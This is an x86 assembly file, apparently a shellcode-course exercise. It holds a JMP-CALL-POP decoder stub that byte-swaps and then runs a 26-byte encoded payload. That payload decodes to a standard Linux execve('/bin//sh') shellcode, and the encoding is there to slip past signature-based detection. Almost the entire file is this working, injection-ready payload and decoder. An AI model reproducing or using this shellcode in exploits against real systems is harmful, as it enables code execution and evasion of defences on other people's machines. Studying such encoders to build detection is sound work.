global _start

section .text
_start:

	jmp short call_shellcode

decoder:
	pop esi			; now contains address of the encoded shellcode
	xor ecx,ecx
	mov cl,13		;13 = 26/2, shellcode is decoded 2bytewise (swap)

decode:
	;swap first byte (esi) and second byte (esi+1)
	mov al,[esi]		;load first byte to al
	inc esi
	mov ah,[esi]		;load second byte to ah
	mov [esi],al		;load al to second byte
	dec esi
	mov [esi],ah		;load ah to first byte


	;mov to next 2 bytes
	add esi,2		;esi + 2
	loop decode

	jmp short EncodedShellcode


call_shellcode:

	call decoder
	EncodedShellcode: db 0xc0,0x31,0x68,0x50,0x2f,0x2f,0x68,0x73,0x2f,0x68,0x69,0x62,0x89,0x6e,0x50,0xe3,0xe2,0x89,0x89,0x53,0xb0,0xe1,0xcd,0x0b,0x90,0x80
	;shellcode length = 26


